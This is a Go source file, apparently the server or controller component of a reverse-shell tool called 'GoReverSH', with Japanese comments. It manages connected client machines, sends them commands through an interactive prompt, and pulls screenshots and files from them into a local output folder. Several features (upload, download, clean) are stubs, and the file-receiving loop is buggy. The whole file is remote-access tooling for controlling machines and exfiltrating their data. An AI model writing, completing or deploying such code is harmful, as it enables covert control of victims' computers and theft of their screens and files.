package server

import (
	"GoReverSH/utils"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"sync"
)

type Observer struct {
	Sender         Sender
	State          State
	Subject        <-chan Notification
	PromptViewFlag bool
	Lock           *sync.Mutex
}

//受け取った通知の種別によってメッセージの送信, あるいはメンバーの追加/削除を行います
func (observer Observer) WaitNotice(ctx context.Context) error {
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			notice := <-observer.Subject
			switch notice.Type {
			case JOIN:
				observer.State.ClientMap[notice.Client.Name] = notice.Client
				if observer.Sender.connectingClient == nil {
					observer.Sender.connectingClient = notice.Client
				}
				observer.printPrompt()

			case DEFECT:
				fmt.Println("Connection Close")
				notice.Client.Conn.Close()
				delete(observer.State.ClientMap, notice.Client.Name)
				if 0 < len(observer.State.ClientMap) {
					for _, c := range observer.State.ClientMap {
						observer.Sender.connectingClient = c
						break
					}
				}
				observer.printPrompt()

			case COMMAND:
				observer.Sender.SendMessage(notice.Command)
				observer.printPrompt()

			case MESSAGE:
				fmt.Printf("\n%s\n", notice.Message)
				observer.printPrompt()

				//30
			case UPLOAD:
				fmt.Println("UPLOAD")
				observer.printPrompt()

				//29
			case DOWNLOAD:
				observer.Lock.Lock()
				fmt.Println("DOWNLOAD")

				observer.Lock.Unlock()
				observer.printPrompt()

				//28
			case SCREEN_SHOT:
				observer.Lock.Lock()
				fmt.Println("SCREENSHOT")
				observer.Sender.SendMessage(notice.Command)

				//ファイル名
				//画像を受け取り
				err := downloadFiles(observer.Sender.connectingClient.Conn)
				if err != nil {
					log.Fatalln(err)
				}

				observer.Lock.Unlock()
				fmt.Println("finished")
				observer.printPrompt()

				//30
			case CLEAN:
				fmt.Println("CLEAN")
				observer.printPrompt()

			default:
				log.Println(notice)
			}
		}
	}
}

func (o Observer) printPrompt() {
	if o.Sender.connectingClient != nil {
		fmt.Printf("[GoReverSH@%s] >", o.Sender.connectingClient.Name)
	} else {
		fmt.Println("wait...")
	}
}

//先にサイズを受け取る
//サイズ分のバッファを確保
//読み込む
//バッファ分読み込んだら、次のファイル
//サイズ0、名前空、中身なしの場合終了
func downloadFiles(conn net.Conn) error {
	for {
		output := utils.Output{}

		fileInfoBuff := make([]byte, 1024)
		n, err := conn.Read(fileInfoBuff)
		if err != nil {
			log.Fatalln(err)
			break
		}

		data := strings.Trim(string(fileInfoBuff[:n]), ":")

		//err := json.NewDecoder(conn).Decode(&output)
		fmt.Println(string(data))
		err = json.Unmarshal([]byte(data), &output)
		if err != nil {
			log.Fatalln(err)
			break
		}
		fmt.Println(output)

		if output.Type == utils.FIN {
			log.Fatal()
			break
		}

		//TODO 出力フォルダは設定ファイルに記載
		outdir := "./output/"
		f, err := os.Create(outdir + output.FileInfo.Name)
		if err != nil {
			log.Fatalln(err)
			break
		}

		/*
			var content []byte
			buff := make([]byte, 1024)
			size := 0

			for int64(size) < output.FileInfo.Size {
				n, err := conn.Read(buff)
				if err != nil {
					break
				}
				tmp := make([]byte, 0, size+n)
				tmp = append(content[:size], buff[:n]...)
				content = tmp
				size += n
			}
		*/

		//fileInfoのWriteが消されてしまう
		_, err = io.Copy(f, conn)
		if err != nil {
			break
		}

		f.Close()
	}
	return nil
}
